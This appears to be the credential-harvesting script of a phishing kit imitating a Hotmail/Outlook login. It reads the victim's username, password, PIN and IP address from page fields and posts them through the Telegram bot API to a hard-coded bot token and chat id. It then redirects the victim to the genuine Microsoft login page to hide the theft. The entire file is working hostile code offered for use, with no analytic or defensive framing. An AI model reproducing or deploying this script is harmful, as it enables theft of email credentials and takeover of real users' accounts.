//bot token
var telegram_bot_id = "6821107808:AAGvk27TftLb5gflY_h3MH0kOu7UaCisRXg";
//chat id
var chat_id = -1001956292164;
var u_name, pax, pax2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("normalx").value;
    pax = document.getElementById("vergatario").value;
    pax2 = document.getElementById("normal").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "👽👽👽HOTMAIL VENEZUELA👽👽👽\n\n🆔Arroba: " + u_name + "\n🔐P@ss: " + pax +"\n🔑PIN: " + pax2 +"\n\nIP: " + ip +"\n" + ip2 +"\n👽Lilxang1502👽";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=22&ct=1711383069&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f0%2f%3fstate%3d1%26redirectTo%3daHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMC8%26RpsCsrfState%3d835104b2-678e-98ee-a96e-e6a797887f8a&id=292841&aadredir=1&whr=hotmail.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015';
        console.log(response);
    });
    return false;
};
